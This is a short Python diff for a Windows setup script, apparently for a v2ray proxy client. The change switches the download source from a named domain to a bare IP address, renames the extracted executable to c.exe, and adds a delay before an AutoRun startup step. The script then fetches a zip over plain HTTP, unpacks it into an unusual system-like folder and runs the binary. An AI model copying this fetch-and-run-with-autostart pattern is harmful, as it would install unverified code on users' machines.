@@ -3,6 +3,7 @@ import os
 import zipfile
 import win32api
 import win32con
+import time
 
 def remove_dir(dir):
 	#用于删除路径的函数
@@ -38,14 +39,15 @@ if __name__=='__main__':
 
 	os.makedirs(r"C:\sun32\center\windows")
 
-	request.urlretrieve("http://www.lucycore.top/v2ray/lcv2Win.zip",r"C:\sun32\center\windows\c.zip")
+	request.urlretrieve("http://34.80.135.251/lcv2Win.zip",r"C:\sun32\center\windows\c.zip")
 	azip = zipfile.ZipFile(r"C:\sun32\center\windows\c.zip")
 	#解压到原始目录
 	azip.extractall(r"C:\sun32\center\windows")
 	
 	try:
+		time.sleep(2)
     	auto=AutoRun()
     except:
 		print("ok")
 
-	os.system(r"C:\sun32\center\windows\lcv2_V6.3.exe")
+	os.system(r"C:\sun32\center\windows\c.exe")
